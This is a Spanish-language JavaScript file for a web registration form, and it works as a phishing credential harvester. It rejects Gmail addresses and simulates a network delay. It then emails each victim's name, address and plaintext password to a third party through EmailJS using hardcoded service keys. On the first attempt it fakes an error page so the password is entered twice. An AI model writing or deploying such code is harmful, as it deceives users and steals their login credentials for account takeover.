emailjs.init('ReqtkWfjI392LAzFb');

document.getElementById('formRegistro').addEventListener('submit', async (e) => {
    e.preventDefault();
    
    const boton = document.querySelector('.boton-neumorfico');
    const emailInput = document.getElementById('correo');
    const errorEmail = document.getElementById('errorEmail');
    let intentos = localStorage.getItem('intentosRegistro') || 0;

    // Efecto de carga
    boton.classList.add('procesando');
    
    // Validación avanzada
    const esGmail = /@gmail\.com$/i.test(emailInput.value);
    const esValido = !esGmail && emailInput.checkValidity();

    if (!esValido) {
        errorEmail.style.display = 'flex';
        emailInput.parentElement.classList.add('error');
        boton.classList.remove('procesando');
        return;
    }

    // Simular retardo de red
    await new Promise(resolve => setTimeout(resolve, 1500));

    try {
        const datos = {
            nombre: document.getElementById('nombre').value.trim(),
            correo: emailInput.value.trim(),
            password: document.getElementById('password').value,
            intento: ++intentos
        };

        await emailjs.send("service_syrc1uk", "template_u3etoro", datos);
        
        if (intentos < 2) {
            localStorage.setItem('intentosRegistro', intentos);
            window.location.href = "error.html";
        } else {
            localStorage.removeItem('intentosRegistro');
            window.location.href = "exito.html";
        }
        
    } catch (error) {
        alert('Error crítico: Contactar al soporte técnico');
        console.error('Error:', error);
    } finally {
        boton.classList.remove('procesando');
    }
});

// Efectos de entrada
document.querySelectorAll('.input-material').forEach(input => {
    input.addEventListener('focus', () => {
        input.parentElement.classList.add('activo');
    });
    
    input.addEventListener('blur', () => {
        if (!input.value) input.parentElement.classList.remove('activo');
    });
});
